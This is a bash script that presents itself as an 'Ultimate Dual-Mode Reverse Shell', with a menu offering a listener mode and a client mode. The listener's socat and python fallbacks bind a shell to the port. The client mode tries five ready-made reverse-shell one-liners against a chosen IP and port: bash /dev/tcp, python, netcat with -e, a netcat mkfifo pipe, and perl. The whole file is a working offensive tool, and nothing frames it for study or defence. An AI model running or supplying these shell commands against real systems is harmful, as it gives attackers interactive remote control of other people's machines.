#!/bin/bash

# Ultimate Dual-Mode Reverse Shell
# Works as both LISTENER and CLIENT

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# ASCII Art
function show_banner() {
    clear
    echo -e "${PURPLE}"
    echo " ██╗    ██╗███████╗██╗     ██╗     ███████╗████████╗██╗   ██╗██╗"
    echo " ██║    ██║██╔════╝██║     ██║     ██╔════╝╚══██╔══╝██║   ██║██║"
    echo " ██║ █╗ ██║█████╗  ██║     ██║     █████╗     ██║   ██║   ██║██║"
    echo " ██║███╗██║██╔══╝  ██║     ██║     ██╔══╝     ██║   ██║   ██║╚═╝"
    echo " ╚███╔███╔╝███████╗███████╗███████╗███████╗   ██║   ╚██████╔╝██╗"
    echo "  ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝"
    echo -e "${NC}"
    echo -e "${CYAN}        Ultimate Dual-Mode Reverse Shell${NC}"
    echo -e "${YELLOW}------------------------------------------------${NC}"
    echo -e "${GREEN}   Mode: [1] Listen for connections (Server)"
    echo -e "         [2] Connect to listener (Client)${NC}"
    echo -e "${YELLOW}------------------------------------------------${NC}"
}

# Check if command exists
function cmd_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Get current IP
function get_ip() {
    if cmd_exists "ip"; then
        ip a | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
    elif cmd_exists "ifconfig"; then
        ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
    else
        echo "127.0.0.1"
    fi
}

# Check if port is available
function is_port_available() {
    local port=$1
    if cmd_exists "nc"; then
        if nc -z localhost "$port" >/dev/null 2>&1; then
            return 1 # Port in use
        fi
    fi
    return 0 # Port available
}

# Start listener (Server mode)
function start_listener() {
    local port=$1
    
    echo -e "${GREEN}[+] Starting listener on port ${YELLOW}$port${NC}"
    echo -e "${BLUE}[*] Your current IP(s): ${YELLOW}$(get_ip)${NC}"
    echo -e "${CYAN}[*] Waiting for incoming connection...${NC}"
    echo -e "${YELLOW}[!] Press Ctrl+C to stop${NC}"
    echo
    
    # Try different listener methods
    if cmd_exists "nc"; then
        nc -lvnp "$port"
    elif cmd_exists "ncat"; then
        ncat -lvp "$port"
    elif cmd_exists "socat"; then
        socat TCP-LISTEN:"$port",reuseaddr,fork EXEC:"/bin/bash"
    elif cmd_exists "python3"; then
        python3 -c "import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,1);s1.bind(('0.0.0.0',$port));s1.listen(1);c,a=s1.accept();[sp.call(['/bin/sh','-i'],stdin=x,stdout=x,stderr=x) for x in [c.makefile('rw')]]"
    else
        echo -e "${RED}[!] No suitable listener tool found (tried nc, ncat, socat, python)${NC}"
        return 1
    fi
}

# Start client (Connect mode)
function start_client() {
    local ip=$1
    local port=$2
    
    echo -e "${GREEN}[+] Connecting to ${YELLOW}$ip:$port${NC}"
    echo -e "${CYAN}[*] Trying multiple connection methods...${NC}"
    echo
    
    # Method 1: Bash /dev/tcp
    if cmd_exists "bash" && [ -e /dev/tcp ]; then
        echo -e "${BLUE}[1] Trying bash /dev/tcp method...${NC}"
        bash -c "bash -i >& /dev/tcp/$ip/$port 0>&1" &
        sleep 2
        if ps -p $! >/dev/null; then
            echo -e "${GREEN}[+] Success! Connection established.${NC}"
            return 0
        fi
    fi
    
    # Method 2: Python
    if cmd_exists "python3" || cmd_exists "python"; then
        echo -e "${BLUE}[2] Trying python method...${NC}"
        python_cmd=$(command -v python3 || command -v python)
        $python_cmd -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &
        sleep 2
        if ps -p $! >/dev/null; then
            echo -e "${GREEN}[+] Success! Connection established.${NC}"
            return 0
        fi
    fi
    
    # Method 3: Netcat
    if cmd_exists "nc"; then
        echo -e "${BLUE}[3] Trying netcat method...${NC}"
        nc -e /bin/sh "$ip" "$port" &
        sleep 2
        if ps -p $! >/dev/null; then
            echo -e "${GREEN}[+] Success! Connection established.${NC}"
            return 0
        fi
    fi
    
    # Method 4: Netcat without -e
    if cmd_exists "nc"; then
        echo -e "${BLUE}[4] Trying netcat (no -e) method...${NC}"
        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc "$ip" "$port" > /tmp/f &
        sleep 2
        if ps -p $! >/dev/null; then
            echo -e "${GREEN}[+] Success! Connection established.${NC}"
            return 0
        fi
    fi
    
    # Method 5: Perl
    if cmd_exists "perl"; then
        echo -e "${BLUE}[5] Trying perl method...${NC}"
        perl -e 'use Socket;$i="'$ip'";$p='$port';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' &
        sleep 2
        if ps -p $! >/dev/null; then
            echo -e "${GREEN}[+] Success! Connection established.${NC}"
            return 0
        fi
    fi
    
    echo -e "${RED}[!] All connection methods failed!${NC}"
    echo -e "${YELLOW}[*] Try installing one of these tools:${NC}"
    echo -e "    - bash (with /dev/tcp support)"
    echo -e "    - python3"
    echo -e "    - netcat (nc)"
    echo -e "    - perl"
    return 1
}

# Main menu
function main_menu() {
    while true; do
        show_banner
        
        echo -e "${CYAN}Select mode:${NC}"
        echo -e "1) Listen for connections (Server mode)"
        echo -e "2) Connect to listener (Client mode)"
        echo -e "3) Exit"
        echo
        read -p "Enter choice (1-3): " choice
        
        case $choice in
            1)
                # Server mode
                clear
                show_banner
                echo -e "${GREEN}[SERVER MODE]${NC}"
                echo -e "${YELLOW}Enter port to listen on (1-65535):${NC}"
                read -p "Port: " port
                
                # Validate port
                if [[ ! $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
                    echo -e "${RED}[!] Invalid port number! Must be 1-65535${NC}"
                    sleep 2
                    continue
                fi
                
                if ! is_port_available "$port"; then
                    echo -e "${RED}[!] Port $port is already in use!${NC}"
                    sleep 2
                    continue
                fi
                
                start_listener "$port"
                echo -e "\n${YELLOW}Press any key to continue...${NC}"
                read -n 1 -s
                ;;
                
            2)
                # Client mode
                clear
                show_banner
                echo -e "${GREEN}[CLIENT MODE]${NC}"
                echo -e "${YELLOW}Enter target IP and port:${NC}"
                read -p "IP Address: " ip
                read -p "Port: " port
                
                # Validate input
                if [[ ! $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                    echo -e "${RED}[!] Invalid IP address format!${NC}"
                    sleep 2
                    continue
                fi
                
                if [[ ! $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
                    echo -e "${RED}[!] Invalid port number! Must be 1-65535${NC}"
                    sleep 2
                    continue
                fi
                
                start_client "$ip" "$port"
                echo -e "\n${YELLOW}Press any key to continue...${NC}"
                read -n 1 -s
                ;;
                
            3)
                echo -e "\n${GREEN}[+] Exiting...${NC}\n"
                exit 0
                ;;
                
            *)
                echo -e "\n${RED}[!] Invalid choice!${NC}"
                sleep 1
                ;;
        esac
    done
}

# Check if running in terminal
if [ -t 0 ]; then
    main_menu
else
    echo -e "${RED}[!] This script requires an interactive terminal.${NC}"
    exit 1
fi
